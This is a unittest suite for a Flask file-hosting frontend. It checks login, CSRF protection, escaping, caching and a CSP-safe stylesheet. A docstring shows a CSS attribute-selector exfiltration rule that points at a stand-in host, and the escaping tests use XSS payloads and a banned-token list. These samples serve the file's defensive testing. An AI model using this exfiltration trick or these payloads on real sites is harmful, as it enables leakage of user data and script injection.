"""Tests for the Flask frontend with the API stubbed out.

Runs anywhere Flask exists - no live API or DB needed.
"""
import os
import re
import sys
import unittest

os.environ.setdefault("FLASK_SECRET_KEY", "test-key")
os.environ.setdefault("MAX_UPLOAD_MB", "100")
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "web"))
import web  # noqa: E402


class FakeResponse:
    def __init__(self, status_code, payload=None, bad_json=False):
        self.status_code = status_code
        self._payload = payload or {}
        self._bad = bad_json

    def json(self):
        if self._bad:
            raise ValueError("not json")
        return self._payload


class WebTests(unittest.TestCase):
    def setUp(self):
        web.app.config["TESTING"] = True
        self.client = web.app.test_client()
        self._orig = web.api_request

    def tearDown(self):
        web.api_request = self._orig

    CSRF = "test-csrf-token-value"

    def seed_csrf(self):
        with self.client.session_transaction() as sess:
            sess["csrf"] = self.CSRF

    def post(self, path, data=None, **kw):
        """POST with a valid CSRF token, as a real browser form would."""
        self.seed_csrf()
        payload = dict(data or {})
        payload.setdefault("_csrf", self.CSRF)
        return self.client.post(path, data=payload, **kw)

    def login_session(self):
        with self.client.session_transaction() as s:
            s["token"] = "tok"
            s["username"] = "alice"

    # ---- core pages ------------------------------------------------------
    def test_anonymous_redirected_to_login(self):
        r = self.client.get("/")
        self.assertEqual(r.status_code, 302)
        self.assertIn("/login", r.headers["Location"])

    def test_login_success_sets_session_and_redirects(self):
        web.api_request = lambda m, p, **k: FakeResponse(
            200, {"access_token": "tok123", "token_type": "bearer"})
        r = self.post("/login",
                             data={"username": "alice", "password": "longenough"})
        self.assertEqual(r.status_code, 302)
        with self.client.session_transaction() as s:
            self.assertEqual(s["token"], "tok123")
            self.assertEqual(s["username"], "alice")

    def test_login_bad_credentials_shows_api_detail(self):
        web.api_request = lambda m, p, **k: FakeResponse(
            401, {"detail": "Invalid username or password"})
        r = self.post("/login",
                             data={"username": "alice", "password": "wrongpass"})
        self.assertEqual(r.status_code, 200)
        self.assertIn(b"Invalid username or password", r.data)

    def test_api_down_login_does_not_crash(self):
        web.api_request = lambda m, p, **k: None
        r = self.post("/login",
                             data={"username": "aaa", "password": "longenough"})
        self.assertEqual(r.status_code, 200)
        self.assertIn(b"Cannot reach the API", r.data)

    def test_api_down_index_does_not_crash(self):
        self.login_session()
        web.api_request = lambda m, p, **k: None
        r = self.client.get("/")
        self.assertEqual(r.status_code, 200)
        self.assertIn(b"Cannot reach the API", r.data)

    def test_index_lists_files(self):
        self.login_session()
        web.api_request = lambda m, p, **k: FakeResponse(200, [
            {"filename": "a.txt", "size": 5, "uploaded_at": "2026-01-01"}])
        r = self.client.get("/")
        self.assertIn(b"a.txt", r.data)

    def test_expired_token_clears_session(self):
        self.login_session()
        web.api_request = lambda m, p, **k: FakeResponse(401, {"detail": "Token expired"})
        r = self.client.get("/")
        self.assertEqual(r.status_code, 302)
        with self.client.session_transaction() as s:
            self.assertNotIn("token", s)

    def test_non_json_error_body_does_not_crash(self):
        web.api_request = lambda m, p, **k: FakeResponse(500, bad_json=True)
        r = self.post("/login",
                             data={"username": "alice", "password": "longenough"})
        self.assertEqual(r.status_code, 200)
        self.assertIn(b"Login failed", r.data)

    def test_upload_requires_login(self):
        r = self.post("/upload", data={})
        self.assertEqual(r.status_code, 302)
        self.assertIn("/login", r.headers["Location"])

    def test_oversize_post_rejected_with_413_flow(self):
        self.login_session()
        big = b"x" * (web.app.config["MAX_CONTENT_LENGTH"] + 1)
        r = self.post(
            "/upload", data={"file": (__import__("io").BytesIO(big), "big.bin")},
            content_type="multipart/form-data")
        self.assertEqual(r.status_code, 302)   # redirected by the 413 handler

    def test_register_conflict_message_surfaces(self):
        web.api_request = lambda m, p, **k: FakeResponse(
            409, {"detail": "Username or email already taken"})
        r = self.post("/register", data={
            "username": "alice", "password": "longenough", "email": "a@b.com"})
        self.assertIn(b"Username or email already taken", r.data)

    def test_register_page_has_email_field(self):
        r = self.client.get("/register")
        # attributes are properly quoted since the v2.12 redesign
        self.assertIn(b'name="email"', r.data)
        self.assertIn(b'type="email"', r.data)

    # ---- v2.9: download + delete UI ------------------------------------
    def test_table_shows_download_and_delete_links(self):
        self.login_session()
        web.api_request = lambda m, p, **k: FakeResponse(200, [
            {"filename": "a.txt", "size": 5, "uploaded_at": "2026-01-01"}])
        r = self.client.get("/")
        self.assertIn(b"/download/a.txt", r.data)
        self.assertIn(b"/delete/a.txt", r.data)

    def test_download_requires_login(self):
        r = self.client.get("/download/a.txt")
        self.assertEqual(r.status_code, 302)
        self.assertIn("/login", r.headers["Location"])

    def test_download_streams_through_with_headers(self):
        self.login_session()

        class StreamResp(FakeResponse):
            headers = {"Content-Type": "application/octet-stream",
                       "Content-Disposition": 'attachment; filename="a.txt"'}
            def iter_content(self, chunk_size=0):
                yield b"file-bytes"

        web.api_request = lambda m, p, **k: StreamResp(200)
        r = self.client.get("/download/a.txt")
        self.assertEqual(r.status_code, 200)
        self.assertEqual(r.data, b"file-bytes")
        self.assertIn("attachment", r.headers["Content-Disposition"])

    def test_delete_get_only_confirms_and_never_calls_api(self):
        """A prefetcher following the Delete link must not delete."""
        self.login_session()
        called = []
        web.api_request = lambda m, p, **k: called.append(m) or FakeResponse(200, {})
        r = self.client.get("/delete/a.txt")
        self.assertEqual(r.status_code, 200)
        self.assertIn(b"Delete this file?", r.data)
        self.assertIn(b"a.txt", r.data)
        self.assertEqual(called, [])          # no API call on GET

    def test_delete_post_calls_api_and_redirects(self):
        self.login_session()
        calls = []
        web.api_request = lambda m, p, **k: calls.append((m, p)) or FakeResponse(
            200, {"deleted": "a.txt"})
        r = self.post("/delete/a.txt")
        self.assertEqual(r.status_code, 302)
        self.assertEqual(calls, [("DELETE", "/files/a.txt")])

    def test_delete_api_error_surfaces_detail(self):
        self.login_session()
        web.api_request = lambda m, p, **k: FakeResponse(404, {"detail": "File not found"})
        r = self.post("/delete/a.txt", follow_redirects=True)
        self.assertIn(b"File not found", r.data)

    def test_delete_requires_login(self):
        r = self.post("/delete/a.txt")
        self.assertEqual(r.status_code, 302)
        self.assertIn("/login", r.headers["Location"])

    # ---- v2.12: the redesign must stay JavaScript-free -------------------
    def test_no_page_contains_javascript(self):
        """CSP sets script-src 'none' - a <script> tag would be blocked,
        so it must never appear. Also catches inline on* handlers."""
        import re
        self.login_session()
        web.api_request = lambda m, p, **k: FakeResponse(200, [
            {"filename": "a.txt", "size": 5, "uploaded_at": "2026-01-01"}])
        for path in ("/", "/login", "/register", "/forgot",
                     "/reset?token=abc", "/delete/a.txt"):
            html = self.client.get(path).data.decode().lower()
            self.assertNotIn("<script", html, f"<script> in {path}")
            self.assertNotIn("javascript:", html, f"javascript: URL in {path}")
            self.assertIsNone(re.search(r'\son[a-z]+\s*=', html),
                              f"inline event handler in {path}")

    def test_pages_are_wellformed_and_titled(self):
        self.login_session()
        web.api_request = lambda m, p, **k: FakeResponse(200, [])
        for path, want in (("/", "Your files"), ("/login", "Log in"),
                           ("/register", "Register"), ("/forgot", "Forgot password")):
            html = self.client.get(path).data.decode()
            self.assertIn(f"<title>{want} - Client File Host</title>", html)
            self.assertIn('<meta name="viewport"', html)
            self.assertEqual(html.count("<body>"), 1)
            self.assertEqual(html.count("</html>"), 1)

    def test_sizes_and_dates_are_humanised(self):
        self.login_session()
        web.api_request = lambda m, p, **k: FakeResponse(200, [
            {"filename": "big.bin", "size": 2411724,
             "uploaded_at": "2026-09-05 13:21:48.100000+00:00"}])
        html = self.client.get("/").data.decode()
        self.assertIn("2.3 MB", html)
        self.assertIn("05 Sep 2026", html)
        self.assertNotIn("2411724", html)

    def test_empty_state_when_no_files(self):
        self.login_session()
        web.api_request = lambda m, p, **k: FakeResponse(200, [])
        html = self.client.get("/").data.decode()
        self.assertIn("No files yet", html)

    # ---- v2.12: external stylesheet (lets CSP drop 'unsafe-inline') ----
    # ---- the stylesheet must stay inert -----------------------------
    # These are the tests that keep the security property true. The CSS
    # is clean today; without a guard, one convenient background-image
    # in six months silently reopens the exfiltration channel.
    def _css(self):
        return self.client.get("/style.css").get_data(as_text=True)

    def test_css_has_no_network_requests(self):
        """url() is the CSS exfiltration primitive:
             input[value^="a"] { background-image: url("//evil/a") }
        No url() anywhere means no request can ever be issued."""
        self.assertNotIn("url(", self._css().replace(" ", ""))

    def test_css_has_no_import(self):
        self.assertNotIn("@import", self._css())

    def test_css_has_no_font_face(self):
        """@font-face + unicode-range leaks text one glyph range at a
        time. System fonts only; the CSP also sets font-src 'none'."""
        self.assertNotIn("@font-face", self._css())

    def test_css_has_no_absolute_urls(self):
        import re
        self.assertEqual(re.findall(r"https?://", self._css()), [])

    def test_css_has_no_ie_expression(self):
        self.assertNotIn("expression(", self._css().replace(" ", ""))

    def test_no_page_carries_an_inline_style_attribute(self):
        """style="" is blocked by style-src 'self' too - so if one ever
        appears the page silently loses that styling. Catch it here."""
        self.login_session()
        web.api_request = lambda m, p, **k: FakeResponse(200, [])
        for path in ("/", "/login", "/register", "/forgot",
                     "/reset?token=t", "/delete/a.txt"):
            body = self.client.get(path, follow_redirects=True).get_data(as_text=True)
            self.assertNotIn("style=", body, f"inline style attribute in {path}")

    def test_stylesheet_is_served_as_css(self):
        r = self.client.get("/style.css")
        self.assertEqual(r.status_code, 200)
        self.assertTrue(r.headers["Content-Type"].startswith("text/css"))
        self.assertIn(b"body", r.data)
        self.assertIn("ETag", r.headers)

    def test_stylesheet_returns_304_when_cached(self):
        etag = self.client.get("/style.css").headers["ETag"]
        r = self.client.get("/style.css", headers={"If-None-Match": etag})
        self.assertEqual(r.status_code, 304)

    def test_pages_link_the_stylesheet_and_have_no_inline_style_block(self):
        """The whole point: an inline <style> would force the CSP to keep
        'unsafe-inline', which also permits an INJECTED <style>."""
        for path in ("/login", "/register", "/forgot"):
            body = self.client.get(path).data
            self.assertIn(b'<link rel="stylesheet" href="/style.css', body, path)
            self.assertNotIn(b"<style>", body, path)

    def test_no_javascript_anywhere_in_rendered_pages(self):
        self.login_session()
        web.api_request = lambda m, p, **k: FakeResponse(200, [
            {"filename": "a.txt", "size": 5, "uploaded_at": "2026-01-01 00:00:00"}])
        pages = [self.client.get(p).data for p in
                 ("/", "/login", "/register", "/forgot", "/delete/a.txt")]
        pages.append(self.client.get("/style.css").data)
        for body in pages:
            low = body.lower()
            for banned in (b"<script", b"javascript:", b"onclick=", b"onsubmit=",
                           b"onload=", b"onerror="):
                self.assertNotIn(banned, low)

    def test_cookie_flags(self):
        self.assertTrue(web.app.config["SESSION_COOKIE_HTTPONLY"])
        self.assertEqual(web.app.config["SESSION_COOKIE_SAMESITE"], "Lax")

    # ---- v2.3: forgot/reset flow ----------------------------------------
    def test_login_page_has_forgot_link(self):
        r = self.client.get("/login")
        self.assertIn(b"Forgot password?", r.data)
        self.assertIn(b"/forgot", r.data)

    def test_forgot_page_and_submit_redirects_with_generic_msg(self):
        r = self.client.get("/forgot")
        self.assertIn(b"reset link", r.data)
        web.api_request = lambda m, p, **k: FakeResponse(
            200, {"message": "If that email is registered, a reset link is on its way."})
        r = self.post("/forgot", data={"email": "a@b.com"})
        self.assertEqual(r.status_code, 302)
        self.assertIn("/login", r.headers["Location"])

    def test_forgot_api_down_does_not_crash(self):
        web.api_request = lambda m, p, **k: None
        r = self.post("/forgot", data={"email": "a@b.com"})
        self.assertEqual(r.status_code, 200)
        self.assertIn(b"Cannot reach the API", r.data)

    def test_reset_get_requires_token(self):
        r = self.client.get("/reset")
        self.assertEqual(r.status_code, 302)
        self.assertIn("/forgot", r.headers["Location"])

    def test_reset_get_renders_form_with_token(self):
        r = self.client.get("/reset?token=abc123XYZ")
        self.assertEqual(r.status_code, 200)
        self.assertIn(b'value="abc123XYZ"', r.data)

    def test_reset_password_mismatch_stays_on_form(self):
        called = []
        web.api_request = lambda m, p, **k: called.append(p) or FakeResponse(200, {})
        r = self.post("/reset", data={
            "token": "t1", "new_password": "longenough",
            "confirm_password": "different1"})
        self.assertEqual(r.status_code, 200)
        self.assertIn(b"do not match", r.data)
        self.assertEqual(called, [])          # API never called on mismatch

    def test_reset_invalid_token_shows_api_error(self):
        web.api_request = lambda m, p, **k: FakeResponse(
            400, {"detail": "Invalid or expired reset link"})
        r = self.post("/reset", data={
            "token": "bad", "new_password": "longenough",
            "confirm_password": "longenough"})
        self.assertEqual(r.status_code, 200)
        self.assertIn(b"Invalid or expired reset link", r.data)

    def test_reset_success_redirects_to_login(self):
        web.api_request = lambda m, p, **k: FakeResponse(
            200, {"message": "Password updated. Please log in with your new password."})
        r = self.post("/reset", data={
            "token": "t1", "new_password": "longenough",
            "confirm_password": "longenough"})
        self.assertEqual(r.status_code, 302)
        self.assertIn("/login", r.headers["Location"])


if __name__ == "__main__":
    unittest.main()


class CsrfTests(unittest.TestCase):
    """A state-changing request must prove it came from one of our pages."""

    def setUp(self):
        web.app.config["TESTING"] = True
        self.client = web.app.test_client()
        self._orig = web.api_request
        self.called = []
        web.api_request = lambda m, p, **k: self.called.append((m, p)) or FakeResponse(
            200, {"access_token": "t", "detail": "ok", "message": "ok"})

    def tearDown(self):
        web.api_request = self._orig

    def test_post_without_token_is_refused(self):
        r = self.client.post("/login", data={"username": "a", "password": "b"})
        self.assertEqual(r.status_code, 400)
        self.assertIn(b"Request blocked", r.data)
        self.assertEqual(self.called, [])      # never reached the API

    def test_post_with_wrong_token_is_refused(self):
        with self.client.session_transaction() as s:
            s["csrf"] = "the-real-token"
        r = self.client.post("/login", data={"username": "a", "password": "b",
                                             "_csrf": "guessed"})
        self.assertEqual(r.status_code, 400)
        self.assertEqual(self.called, [])

    def test_post_with_correct_token_is_allowed(self):
        with self.client.session_transaction() as s:
            s["csrf"] = "the-real-token"
        r = self.client.post("/login", data={"username": "a", "password": "b",
                                             "_csrf": "the-real-token"})
        self.assertNotEqual(r.status_code, 400)
        self.assertTrue(self.called)

    def test_delete_without_token_is_refused(self):
        with self.client.session_transaction() as s:
            s["token"] = "tok"; s["username"] = "alice"; s["csrf"] = "real"
        r = self.client.post("/delete/a.txt", data={})
        self.assertEqual(r.status_code, 400)
        self.assertEqual(self.called, [])      # no DELETE reached the API

    def test_every_post_form_carries_a_hidden_token(self):
        pages = ["/login", "/register", "/forgot", "/reset?token=x"]
        for p in pages:
            body = self.client.get(p).get_data(as_text=True)
            for form in re.findall(r"<form[^>]*method=[\"']?post.*?</form>",
                                   body, re.I | re.S):
                self.assertIn('name="_csrf"', form, f"form without token on {p}")

    def test_token_differs_between_sessions(self):
        a = web.app.test_client(); b = web.app.test_client()
        ta = re.search(r'name="_csrf" value="([^"]+)"',
                       a.get("/login").get_data(as_text=True)).group(1)
        tb = re.search(r'name="_csrf" value="([^"]+)"',
                       b.get("/login").get_data(as_text=True)).group(1)
        self.assertNotEqual(ta, tb)
        self.assertGreaterEqual(len(ta), 32)


class ResponseHardeningTests(unittest.TestCase):
    def setUp(self):
        web.app.config["TESTING"] = True
        self.client = web.app.test_client()
        self._orig = web.api_request

    def tearDown(self):
        web.api_request = self._orig

    def test_html_is_never_cached(self):
        """A file listing is private data; it must not survive in the
        browser cache after the user walks away from a shared machine."""
        r = self.client.get("/login")
        self.assertIn("no-store", r.headers.get("Cache-Control", ""))

    def test_stylesheet_is_still_cacheable(self):
        r = self.client.get("/style.css")
        self.assertNotIn("no-store", r.headers.get("Cache-Control", ""))

    def test_hostile_filename_is_escaped_not_executed(self):
        """Stored XSS: the filename comes from another user's upload."""
        with self.client.session_transaction() as s:
            s["token"] = "tok"; s["username"] = "alice"
        evil = '<img src=x onerror="alert(1)">'
        web.api_request = lambda m, p, **k: FakeResponse(200, [
            {"filename": evil, "size": 1, "uploaded_at": "2026-01-01"}])
        body = self.client.get("/").get_data(as_text=True)
        self.assertNotIn(evil, body)              # not rendered raw
        self.assertIn("&lt;img", body)            # escaped instead

    def test_hostile_flash_message_is_escaped(self):
        web.api_request = lambda m, p, **k: FakeResponse(
            401, {"detail": "<script>alert(1)</script>"})
        r = self.client.post("/login", data={"username": "a", "password": "b",
                                             "_csrf": "x"}, follow_redirects=True)
        self.assertNotIn("<script>alert(1)</script>", r.get_data(as_text=True))
